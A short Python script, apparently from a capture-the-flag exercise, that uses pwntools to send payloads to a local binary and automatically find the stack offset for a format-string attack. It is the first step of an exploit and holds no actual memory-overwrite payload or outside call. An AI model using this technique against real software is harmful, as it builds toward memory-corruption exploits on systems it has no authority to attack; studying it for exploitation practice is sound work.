from pwn import *

def exec_fmt(payload):
     p = process("./program")
     p.sendline(payload)
     return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
